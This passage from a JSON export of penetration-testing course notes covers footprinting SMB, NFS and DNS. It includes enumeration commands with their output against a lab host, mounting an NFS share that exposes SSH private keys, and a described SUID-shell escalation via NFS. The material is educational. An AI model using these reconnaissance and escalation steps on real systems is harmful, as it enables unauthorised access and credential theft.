mrb3n, uid = 1000\nFound user: cry0l1t3, uid = 1001\nmrb3n (1000)/FullName: \nmrb3n (1000)/UserComment: \nmrb3n (1000)/PrimaryGroupId: 513\nmrb3n (1000)/BadPasswordCount: 0\nmrb3n (1000)/LogonCount: 0\nmrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59\nmrb3n (1000)/PasswordDoesNotExpire: False\nmrb3n (1000)/AccountIsDisabled: False\nmrb3n (1000)/ScriptPath: \ncry0l1t3 (1001)/FullName: cry0l1t3\ncry0l1t3 (1001)/UserComment: \ncry0l1t3 (1001)/PrimaryGroupId: 513\ncry0l1t3 (1001)/BadPasswordCount: 0\ncry0l1t3 (1001)/LogonCount: 0\ncry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56\ncry0l1t3 (1001)/PasswordDoesNotExpire: False\ncry0l1t3 (1001)/AccountIsDisabled: False\ncry0l1t3 (1001)/ScriptPath: \n[*] Received 2 entries.\n```\n\nThe information we have already obtained with `rpcclient` can also be obtained using other tools. For example, the [SMBMap](https://github.com/ShawnDEvans/smbmap) and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) tools are also widely used and helpful for the enumeration of SMB services.\n\n#### SMBmap\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbmap -H 10.129.14.128\n\n[+] Finding open SMB ports....\n[+] User SMB session established on 10.129.14.128...\n[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        home                                                    NO ACCESS       INFREIGHT Samba\n        dev                                                     NO ACCESS       DEVenv\n        notes                                                   NO ACCESS       CheckIT\n        IPC$                                                    NO ACCESS       IPC Service (DEVSM)\n```\n\n#### CrackMapExec\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''\n\nSMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)\nSMB         10.129.14.128   445    DEVSMB           [+] \\: \nSMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares\nSMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark\nSMB         10.129.14.128   445    DEVSMB           -----           -----------     ------\nSMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers\nSMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba\nSMB         10.129.14.128   445    DEVSMB           dev                             DEVenv\nSMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT\nSMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)\n```\n\nAnother tool worth mentioning is the so-called [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information.\n\n#### Enum4Linux-ng - Installation\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git\ndrxh3kr@htb[/htb]$ cd enum4linux-ng\ndrxh3kr@htb[/htb]$ pip3 install -r requirements.txt\n```\n\n#### Enum4Linux-ng - Enumeration\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A\n\nENUM4LINUX - next generation\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... 10.129.14.128\n[*] Username ......... ''\n[*] Random Username .. 'juzgtcsu'\n[*] Password ......... ''\n[*] Timeout .......... 5 second(s)\n\n =====================================\n|    Service Scan on 10.129.14.128    |\n =====================================\n[*] Checking LDAP\n[-] Could not connect to LDAP on 389/tcp: connection refused\n[*] Checking LDAPS\n[-] Could not connect to LDAPS on 636/tcp: connection refused\n[*] Checking SMB\n[+] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS\n[+] SMB over NetBIOS is accessible on 139/tcp\n\n =====================================================\n|    NetBIOS Names and Workgroup for 10.129.14.128    |\n =====================================================\n[+] Got domain/workgroup name: DEVOPS\n[+] Full NetBIOS names information:\n- DEVSMB          <00> -         H <ACTIVE>  Workstation Service\n- DEVSMB          <03> -         H <ACTIVE>  Messenger Service\n- DEVSMB          <20> -         H <ACTIVE>  File Server Service\n- ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser\n- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name\n- DEVOPS          <1d> -         H <ACTIVE>  Master Browser\n- DEVOPS          <1e> - <GROUP> H <ACTIVE>  Browser Service Elections\n- MAC Address = 00-00-00-00-00-00\n\n ==========================================\n|    SMB Dialect Check on 10.129.14.128    |\n ==========================================\n[*] Trying on 445/tcp\n[+] Supported dialects and settings:\nSMB 1.0: false\nSMB 2.02: true\nSMB 2.1: true\nSMB 3.0: true\nSMB1 only: false\nPreferred dialect: SMB 3.0\nSMB signing required: false\n\n ==========================================\n|    RPC Session Check on 10.129.14.128    |\n ==========================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user session\n[+] Server allows session using username 'juzgtcsu', password ''\n[H] Rerunning enumeration with user 'juzgtcsu' might give more results\n\n ====================================================\n|    Domain Information via RPC for 10.129.14.128    |\n ====================================================\n[+] Domain: DEVOPS\n[+] SID: NULL SID\n[+] Host is part of a workgroup (not a domain)\n\n ============================================================\n|    Domain Information via SMB session for 10.129.14.128    |\n ============================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: DEVSMB\nNetBIOS domain name: ''\nDNS domain: ''\nFQDN: htb\n\n ================================================\n|    OS Information via RPC for 10.129.14.128    |\n ================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found OS information via SMB\n[*] Enumerating via 'srvinfo'\n[+] Found OS information via 'srvinfo'\n[+] After merging OS information we have the following result:\nOS: Windows 7, Windows Server 2008 R2\nOS version: '6.1'\nOS release: ''\nOS build: '0'\nNative OS: not supported\nNative LAN manager: not supported\nPlatform id: '500'\nServer type: '0x809a03'\nServer type string: Wk Sv PrQ Unx NT SNT DEVSM\n\n ======================================\n|    Users via RPC on 10.129.14.128    |\n ======================================\n[*] Enumerating users via 'querydispinfo'\n[+] Found 2 users via 'querydispinfo'\n[*] Enumerating users via 'enumdomusers'\n[+] Found 2 users via 'enumdomusers'\n[+] After merging user results we have 2 users total:\n'1000':\n  username: mrb3n\n  name: ''\n  acb: '0x00000010'\n  description: ''\n'1001':\n  username: cry0l1t3\n  name: cry0l1t3\n  acb: '0x00000014'\n  description: ''\n\n =======================================\n|    Groups via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating local groups\n[+] Found 0 group(s) via 'enumalsgroups domain'\n[*] Enumerating builtin groups\n[+] Found 0 group(s) via 'enumalsgroups builtin'\n[*] Enumerating domain groups\n[+] Found 0 group(s) via 'enumdomgroups'\n\n =======================================\n|    Shares via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating shares\n[+] Found 5 share(s):\nIPC$:\n  comment: IPC Service (DEVSM)\n  type: IPC\ndev:\n  comment: DEVenv\n  type: Disk\nhome:\n  comment: INFREIGHT Samba\n  type: Disk\nnotes:\n  comment: CheckIT\n  type: Disk\nprint$:\n  comment: Printer Drivers\n  type: Disk\n[*] Testing share IPC$\n[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND\n[*] Testing share dev\n[-] Share doesn't exist\n[*] Testing share home\n[+] Mapping: OK, Listing: OK\n[*] Testing share notes\n[+] Mapping: OK, Listing: OK\n[*] Testing share print$\n[+] Mapping: DENIED, Listing: N/A\n\n ==========================================\n|    Policies via RPC for 10.129.14.128    |\n ==========================================\n[*] Trying port 445/tcp\n[+] Found policy:\ndomain_password_information:\n  pw_history_length: None\n  min_pw_length: 5\n  min_pw_age: none\n  max_pw_age: 49710 days 6 hours 21 minutes\n  pw_properties:\n  - DOMAIN_PASSWORD_COMPLEX: false\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\ndomain_lockout_information:\n  lockout_observation_window: 30 minutes\n  lockout_duration: 30 minutes\n  lockout_threshold: None\ndomain_logoff_information:\n  force_logoff_time: 49710 days 6 hours 21 minutes\n\n ==========================================\n|    Printers via RPC for 10.129.14.128    |\n ==========================================\n[+] No printers returned (this is not an error)\n\nCompleted after 0.61 seconds\n```\n\nWe need to use more than two tools for enumeration. Because it can happen that due to the programming of the tools, we get different information that we have to check manually. Therefore, we should never rely only on automated tools where we do not know precisely how they were written.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/09-NFS",
    "path": "02_CPTS/03-Footprinting/09-NFS.md",
    "title": "09 NFS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, i...",
    "category": "02_CPTS",
    "content": "`Network File System` (`NFS`) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. [NFS](https://en.wikipedia.org/wiki/Network_File_System) is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (`NFSv3`), which has been in use for many years, authenticates the client computer, this changes with `NFSv4`. Here, as with the Windows SMB protocol, the user must authenticate.\n\n|**Version**|**Features**|\n|---|---|\n|`NFSv2`|It is older but is supported by many systems and was initially operated entirely over UDP.|\n|`NFSv3`|It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.|\n|`NFSv4`|It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.|\n\nNFS version 4.1 ([RFC 8881](https://datatracker.ietf.org/doc/html/rfc8881)) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.\n\nNFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has `no` mechanism for `authentication` or `authorization`. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is derived from the available file system information. In this process, the server is responsible for translating the client's user information into the file system's format and converting the corresponding authorization details into the required UNIX syntax as accurately as possible.\n\nThe most common authentication is via UNIX `UID`/`GID` and `group memberships`, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.\n\n---\n\n## Default Configuration\n\nNFS is not difficult to configure because there are not as many options as FTP or SMB have. The `/etc/exports` file contains a table of physical filesystems on an NFS server accessible by the clients. The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows which options it accepts and thus indicates which options are available to us.\n\n#### Exports File\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/exports \n\n# /etc/exports: the access control list for filesystems which may be exported\n#               to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n```\n\nThe default `exports` file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.\n\n|**Option**|**Description**|\n|---|---|\n|`rw`|Read and write permissions.|\n|`ro`|Read only permissions.|\n|`sync`|Synchronous data transfer. (A bit slower)|\n|`async`|Asynchronous data transfer. (A bit faster)|\n|`secure`|Ports above 1024 will not be used.|\n|`insecure`|Ports above 1024 will be used.|\n|`no_subtree_check`|This option disables the checking of subdirectory trees.|\n|`root_squash`|Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount.|\n\nLet us create such an entry for test purposes and play around with the settings.\n\n#### ExportFS\n\nNFS\n\n```shell-session\nroot@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports\nroot@nfs:~# systemctl restart nfs-kernel-server \nroot@nfs:~# exportfs\n\n/mnt/nfs      \t10.129.14.0/24\n```\n\nWe have shared the folder `/mnt/nfs` to the subnet `10.129.14.0/24` with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.\n\n---\n\n## Dangerous Settings\n\nHowever, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:\n\n|**Option**|**Description**|\n|---|---|\n|`rw`|Read and write permissions.|\n|`insecure`|Ports above 1024 will be used.|\n|`nohide`|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|\n|`no_root_squash`|All files created by root are kept with the UID/GID 0.|\n\nIt is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.\n\nWe can take a look at the `insecure` option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.\n\n---\n\n## Footprinting the Service\n\nWhen footprinting NFS, the TCP ports `111` and `2049` are essential. We can also get information about the NFS service and the host via RPC, as shown below in the example.\n\n#### Nmap\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00018s latency).\n\nPORT    STATE SERVICE VERSION\n111/tcp open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.58 seconds\n```\n\nThe `rpcinfo` NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. Also, for NFS, Nmap has some NSE scripts that can be used for the scans. These can then show us, for example, the `contents` of the share and its `stats`.\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE VERSION\n111/tcp  open  rpcbind 2-4 (RPC #100000)\n| nfs-ls: Volume /mnt/nfs\n|   access: Read Lookup NoModify NoExtend NoDelete NoExecute\n| PERMISSION  UID    GID    SIZE  TIME                 FILENAME\n| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .\n| ??????????  ?      ?      ?     ?                    ..\n| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa\n| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub\n| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share\n|_\n| nfs-showmount: \n|_  /mnt/nfs 10.129.14.0/24\n| nfs-statfs: \n|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink\n|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n```\n\nOnce we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.\n\n#### Show Available NFS Shares\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ showmount -e 10.129.14.128\n\nExport list for 10.129.14.128:\n/mnt/nfs 10.129.14.0/24\n```\n\n#### Mounting NFS Share\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ mkdir target-NFS\ndrxh3kr@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\ndrxh3kr@htb[/htb]$ cd target-NFS\ndrxh3kr@htb[/htb]$ tree .\n\n.\n└── mnt\n    └── nfs\n        ├── id_rsa\n        ├── id_rsa.pub\n        └── nfs.share\n\n2 directories, 3 files\n```\n\nThere we will have the opportunity to access the rights and the usernames and groups to whom the shown and viewable files belong. Because once we have the usernames, group names, UIDs, and GUIDs, we can create them on our system and adapt them to the NFS share to view and modify the files.\n\n#### List Contents with Usernames & Group Names\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -l mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv\n-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub\n-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share\n```\n\n#### List Contents with UIDs & GUIDs\n\nNFS\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls -n mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv\n-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub\n-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh\n-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share\n```\n\nIt is important to note that if the `root_squash` option is set, we cannot edit the `backup.sh` file even as `root`.\n\nWe can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.\n\nAfter we have done all the necessary steps and obtained the information we need, we can unmount the NFS share.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/10-DNS",
    "path": "02_CPTS/03-Footprinting/10-DNS.md",
    "title": "10 DNS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Domain Name System (DNS) is an integral part of the Internet. For example, through domain names, such as academy.hackthebox.com or www.hackthebox.com, we can reach the web servers that the hosting...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n`Domain Name System` (`DNS`) is an integral part of the Internet. For example, through domain names, such as [academy.hackthebox.com](https://academy.hackthebox.com) or [www.hackthebox.com](https://www.hackthebox.eu), we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database. Simplified, we can imagine it like a library with many different phone books. The information is distributed over many thousands of name servers. Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:\n\n- DNS root server\n- Authoritative name server\n- Non-authoritative name server\n- Caching server\n- Forwarding server\n- Resolver\n\n|**Server Type**|**Description**|\n|---|---|\n|`DNS Root Server`|The root servers of the DNS are responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The [Internet Corporation for Assigned Names and Numbers](https://www.icann.org/) (`ICANN`) coordinates the work of the root name servers. There are `13` such root servers around the globe.|\n|`Authoritative Nameserver`|Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Based on the country, company, etc., authoritative nameservers provide answers to recursive DNS nameservers, assisting in finding the specific web server(s).|\n|`Non-authoritative Nameserver`|Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.|\n|`Caching DNS Server`|Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.|\n|`Forwarding Server`|Forwarding servers perform only one function: they forward DNS queries to another DNS server.|\n|`Resolver`|Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.|\n\nDNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.\n\nHowever, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain's name servers are called.\n\n![Diagram showing domain hierarchy: Root, Top Level Domains (TLD) like net, org, com, dev, io; Second Level Domain inlanefreight.com; Sub-Domains dev.inlanefreight.com, www.inlanefreight.com, mail.inlanefreight.com; Host WS01.dev.inlanefreight.com.](https://academy.hackthebox.com/storage/modules/27/tooldev-dns.png)\n\nDifferent `DNS records` are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.\n\n|**DNS Record**|**Description**|\n|---|---|\n|`A`|Returns an IPv4 address of the requested domain as a result.|\n|`AAAA`|Returns an IPv6 address of the requested domain.|\n|`MX`|Returns the responsible mail servers as a result.|\n|`NS`|Returns the DNS servers (nameservers) of the domain.|\n|`TXT`|This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.|\n|`CNAME`|This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu.|\n|`PTR`|The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.|\n|`SOA`|Provides information about the corresponding DNS zone and email address of the administrative contact.|\n\nThe `SOA` record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.\n\nDNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig soa www.inlanefreight.com\n\n; <<>> DiG 9.16.27-Debian <<>> soa www.inlanefreight.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15876\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;www.inlanefreight.com.         IN      SOA\n\n;; AUTHORITY SECTION:\ninlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400\n\n;; Query time: 16 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Thu Jan 05 12:56:10 GMT 2023\n;; MSG SIZE  rcvd: 128\n```\n\nThe dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is `awsdns-hostmaster@amazon.com`.\n\n---\n\n## Default Configuration\n\nThere are many different configuration types for DNS. Therefore, we will only discuss the most important ones to illustrate better the functional principle from an administrative point of view. All DNS servers work with three different types of configuration files:\n\n1. local DNS configuration files\n2. zone files\n3. reverse name resolution files\n\nThe DNS server [Bind9](https://www.isc.org/bind/) is very often used on Linux-based distributions. Its local configuration file (`named.conf`) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:\n\n- `named.conf.local`\n- `named.conf.options`\n- `named.conf.log`\n\nIt contains the associated RFC where we can customize the server to our needs and our domain structure with the individual zones for different domains. The configuration file `named.conf` is divided into several options that control the behavior of the name server. A distinction is made between `global options` and `zone options`.\n\nGlobal options are general and affect all zones. A zone option only affects the zone to which it is assigned. Options not listed in named.conf have default values. If an option is both global and zone-specific, then the zone option takes precedence.\n\n#### Local DNS Configuration\n\nDNS\n\n```shell-session\nroot@bind9:~# cat /etc/bind/named.conf.local\n\n//\n// Do any local configuration here\n//\n\n// Consider adding the 1918 zones here, if they are not used in your\n// organization\n//include \"/etc/bind/zones.rfc1918\";\nzone \"domain.com\" {\n    type master;\n    file \"/etc/bind/db.domain.com\";\n    allow-update { key rndc-key; };\n};\n```\n\nIn this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. In addition, many different options extend or reduce the functionality. We can look these up on the [documentation](https://wiki.debian.org/Bind9) of Bind9.\n\nA `zone file` is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one `SOA` record and at least one `NS` record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a `SERVFAIL` error message.\n\nIn short, here, all `forward records` are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.\n\n#### Zone Files\n\nDNS\n\n```shell-session\nroot@bind9:~# cat /etc/bind/db.domain.com\n\n;\n; BIND reverse data file for local loopback interface\n;\n$ORIGIN domain.com\n$TTL 86400\n@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (\n                    2001062501 ; serial\n                    21600      ; refresh after 6 hours\n                    3600       ; retry after 1 hour\n                    604800     ; expire after 1 week\n                    86400 )    ; minimum TTL of 1 day\n\n      IN     NS     ns1.domain.com.\n      IN     NS     ns2.domain.com.\n\n      IN     MX     10     mx.domain.com.\n      IN     MX     20     mx2.domain.com.\n\n             IN     A       10.129.14.5\n\nserver1      IN     A       10.129.14.5\nserver2      IN     A       10.129.14.7\nns1          IN     A       10.129.14.2\nns2          IN     A       10.129.14.3\n\nftp          IN     CNAME   server1\nmx           IN     CNAME   server1\nmx2          IN     CNAME   server2\nwww          IN     CNAME   server2\n```\n\nFor the `Fully Qualified Domain Name` (`FQDN`) to be resolved from the IP address, the DNS server must have a reverse lookup file. In this file, the computer name (`FQDN`) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.\n\n#### Reverse Name Resolution Zone Files\n\nDNS\n\n```shell-session\nroot@bind9:~# cat /etc/bind/db.10.129.14\n\n;\n; BIND reverse data file for local loopback interface\n;\n$ORIGIN 14.129.10.in-addr.arpa\n$TTL 86400\n@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (\n                    2001062501 ; serial\n                    21600      ; refresh after 6 hours\n                    3600       ; retry after 1 hour\n                    604800     ; expire after 1 week\n                    86400 )    ; minimum TTL of 1 day\n\n      IN     NS     ns1.domain.com.\n      IN     NS     ns2.domain.com.\n\n5    IN     PTR    server1.domain.com.\n7    IN     MX     mx.domain.com.\n...SNIP...\n```\n\n---\n\n## Dangerous Settings\n\nThere are many ways in which a DNS server can be attacked. For example, a list 